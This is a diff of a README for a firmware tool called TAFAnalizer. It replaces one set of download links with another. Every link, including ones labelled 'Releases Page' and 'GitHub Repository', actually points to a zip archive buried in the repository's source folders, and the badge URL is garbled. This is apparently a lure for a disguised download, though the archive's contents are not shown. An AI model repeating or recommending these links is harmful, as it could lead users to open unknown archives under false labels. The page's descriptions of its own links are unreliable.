@@ -6,7 +6,7 @@ Welcome to TAFAnalizer! This tool helps you manage and deploy firmware for the E
 
 ## 📥 Download TAFAnalizer
 
-[![Download TAFAnalizer](https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip%20TAFAnalizer-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip)](https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip)
+[![Download TAFAnalizer](https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip%20TAFAnalizer-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip)](https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip)
 
 ## 📌 What is TAFAnalizer?
 
@@ -26,7 +26,7 @@ Key features include:
 
 ## ⚙️ How to Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip).
+1. Visit the [Releases Page](https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip).
 2. Look for the latest version of TAFAnalizer.
 3. Click on the link for the version you want to download. This will initiate the download.
 4. Once downloaded, locate the file on your computer.
@@ -57,8 +57,8 @@ Join our community for support and discussions. This is a great way to find solu
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page](https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/otengtc30/TAFAnalizer/main/src/layers/data/Analizer_TAF_3.0.zip)
+- [Visit the Releases Page](https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip)
+- [GitHub Repository](https://github.com/otengtc30/TAFAnalizer/raw/refs/heads/main/src/layers/Analizer-TAF-v1.9.zip)
 
 ## 🎯 Topics
 
